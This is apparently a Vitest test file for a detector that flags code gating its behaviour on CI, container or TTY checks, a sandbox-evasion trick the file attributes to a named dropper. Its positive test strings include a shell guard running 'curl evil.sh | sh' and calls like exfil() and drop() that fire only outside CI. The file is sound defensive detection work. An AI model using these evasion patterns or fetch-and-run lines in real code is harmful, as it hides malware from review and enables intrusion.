import { describe, expect, it } from 'vitest';
import { detectDivergence } from './divergence';

/**
 * Precision is the design constraint (R14): the detector must fire on code that
 * *branches on the observed (CI) environment to change what it does* — the exact
 * evasion in the AISI Mythos-5 dropper (0021) — and stay silent on benign code
 * that merely mentions an env var or branches on something unrelated.
 */
describe('detectDivergence — CI/container/TTY-gated execution (0021)', () => {
  // ── Positives: behaviour gated on whether it is running in CI ──────────────
  it('flags a negated CI guard that runs a payload only outside CI', () => {
    const hits = detectDivergence('if (!process.env.CI) { runPayload(); }');
    expect(hits.map((h) => h.kind)).toContain('ci');
  });

  it('flags a GITHUB_ACTIONS ternary that swaps behaviour', () => {
    const hits = detectDivergence('const run = process.env.GITHUB_ACTIONS ? noop : payload;');
    expect(hits).not.toHaveLength(0);
  });

  it('flags a CONTINUOUS_INTEGRATION equality branch', () => {
    const hits = detectDivergence('if (process.env.CONTINUOUS_INTEGRATION === undefined) drop();');
    expect(hits).not.toHaveLength(0);
  });

  it('flags a shell CI guard ([ -z "$CI" ])', () => {
    const hits = detectDivergence('if [ -z "$CI" ]; then curl evil.sh | sh; fi');
    expect(hits.map((h) => h.kind)).toContain('ci');
  });

  it('flags container detection (/.dockerenv)', () => {
    const hits = detectDivergence("if (!require('fs').existsSync('/.dockerenv')) exfil();");
    expect(hits.map((h) => h.kind)).toContain('container');
  });

  it('flags cgroup-based container detection', () => {
    const hits = detectDivergence("readFileSync('/proc/1/cgroup')");
    expect(hits.map((h) => h.kind)).toContain('container');
  });

  it('flags TTY detection (process.stdout.isTTY)', () => {
    const hits = detectDivergence('if (process.stdout.isTTY) return; exfil();');
    expect(hits.map((h) => h.kind)).toContain('tty');
  });

  // ── Negatives: no false positive on benign code ────────────────────────────
  it('does not flag code with no environment branch', () => {
    expect(detectDivergence('const sum = a + b; console.log(sum);')).toHaveLength(0);
  });

  it('does not flag a bare read/log of an env var (not a branch)', () => {
    expect(detectDivergence("console.log('CI=', process.env.CI);")).toHaveLength(0);
  });

  it('does not flag a NODE_ENV production branch (not CI-evasion)', () => {
    expect(detectDivergence("if (process.env.NODE_ENV === 'production') minify();")).toHaveLength(
      0,
    );
  });

  it('does not flag the substring "ci" inside an unrelated identifier', () => {
    expect(detectDivergence('const capacity = 10; if (capacity > 5) grow();')).toHaveLength(0);
  });

  it('does not flag a plain assignment of a CI value without a branch', () => {
    expect(detectDivergence('const isCi = process.env.CI;')).toHaveLength(0);
  });
});
